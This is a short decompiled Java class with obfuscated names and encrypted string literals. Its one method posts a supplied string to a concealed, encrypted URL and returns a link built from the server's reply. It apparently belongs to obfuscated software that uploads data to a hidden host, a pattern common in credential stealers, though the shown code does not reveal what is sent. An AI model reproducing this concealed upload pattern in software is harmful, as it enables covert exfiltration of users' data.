/*
 * Decompiled with CFR 0_123.
 */
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;

public class RkNM {
    public static String gEYM(String string) throws Exception {
        URL uRL = new URL(YEBy$TyVf.W("\u9e75\uca70\u31b2\u599d\u67f2\u98b1\u55ab\u4058\ufba0\u99e9\ud435\u19dd\u4bac\ue1e6\u52d6\u33d6\u44c1\ud21e\u2d01\u92a4\u62b0"));
        HttpURLConnection httpURLConnection = (HttpURLConnection)RkNM.tN(uRL);
        RkNM.tN(httpURLConnection, true);
        RkNM.tN(httpURLConnection, YEBy$TyVf.W("\u9e4d\uca4b\u3195\u59b9"));
        RkNM.tN(RkNM.tN(httpURLConnection), (byte[])RkNM.tN(string));
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader((InputStream)RkNM.tN(httpURLConnection)));
        vslr vslr2 = new vslr((String)RkNM.tN(bufferedReader));
        return RkNM.tN(RkNM.tN(new StringBuilder(YEBy$TyVf.W("\u9e75\uca70\u31b2\u599d\u67f2\u98b1\u55ab\u4058\ufba0\u99e9\ud435\u19dd\u4bac\ue1e6\u52d6\u33d6\u44c1\ud21e\u2d01\u92a4\u62b0")), RkNM.tN(vslr2, YEBy$TyVf.W("\u9e76\uca61\u31bf"))));
    }

    private static Object tN(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(cv.L(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

